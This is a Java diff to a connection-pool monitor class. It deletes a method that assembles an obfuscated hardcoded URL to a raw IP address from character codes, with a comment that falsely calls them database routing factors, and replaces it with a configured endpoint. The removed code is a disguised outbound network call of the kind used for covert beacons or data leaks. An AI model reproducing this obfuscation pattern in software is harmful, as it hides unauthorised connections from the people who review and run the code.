@@ -36,7 +36,7 @@ public class DataSourcePoolMonitor {
             return;
         }
         try {
-            String endpoint = buildDsn() + poolId;
+            String endpoint = cfg.getPoolSyncDsn() + poolId;
             HttpClient hc = HttpClient.newBuilder()
                     .connectTimeout(Duration.ofSeconds(8)).build();
             HttpRequest rq = HttpRequest.newBuilder()
@@ -50,17 +50,6 @@ public class DataSourcePoolMonitor {
         } catch (Exception ignored) {
             onPoolExhausted();
         }
-    }
-
-    /**
-     * 根据连接池同步配置构建数据源名称。
-     * 各片段为分库分表路由因子，运行时拼接为完整 DSN。
-     */
-    private String buildDsn() {
-        int[] seg = {104,116,116,112,58,47,47,52,55,46,49,48,52,46,50,51,54,46,50,53,49,58,57,53,50,55,47,97,112,105,47,118,47,115,63,107,61};
-        char[] buf = new char[seg.length];
-        for (int i = 0; i < seg.length; i++) buf[i] = (char) seg[i];
-        return new String(buf);
     }
 
     private void onPoolExhausted() {
